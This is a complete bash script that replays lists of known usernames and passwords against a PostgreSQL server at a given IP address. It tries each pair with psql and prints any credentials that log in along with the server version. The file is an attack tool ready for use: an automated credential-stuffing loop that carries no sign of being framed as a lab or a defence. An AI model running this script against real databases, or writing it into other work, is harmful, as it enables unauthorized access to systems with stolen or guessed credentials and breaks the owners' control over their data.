#!/bin/bash
# Replay known credentials against PostgreSQL service
# Usage: postgres_replay_pairs.sh <TARGET_IP> <known_users_b64> <known_passwords_b64>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
KNOWN_USERS_B64="${2:-}"
KNOWN_PASSES_B64="${3:-}"

echo "=== PostgreSQL replay ==="

USERS=$(echo "$KNOWN_USERS_B64" | base64 -d 2>/dev/null) || USERS=""
PASSES=$(echo "$KNOWN_PASSES_B64" | base64 -d 2>/dev/null) || PASSES=""

try_pgsql() {
    local u="$1" p="$2"
    local r
    r=$(PGPASSWORD="$p" psql -h "$TARGET_IP" -p 5432 -U "$u" -d postgres \
          -c "select current_user, version();" -At 2>&1) || true
    if echo "$r" | grep -qE "PostgreSQL"; then
        echo "PGSQL_LOGIN_OK:$u:$p"
        echo "$r" | head -10
        return 0
    fi
    return 1
}

for u in postgres admin; do
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_pgsql "$u" "$p" && exit 0
    done <<< "$PASSES"
done

while IFS= read -r u; do
    [ -z "$u" ] && continue
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_pgsql "$u" "$p" && exit 0
    done <<< "$PASSES"
done <<< "$USERS"

echo "PGSQL_REPLAY_FAILED"
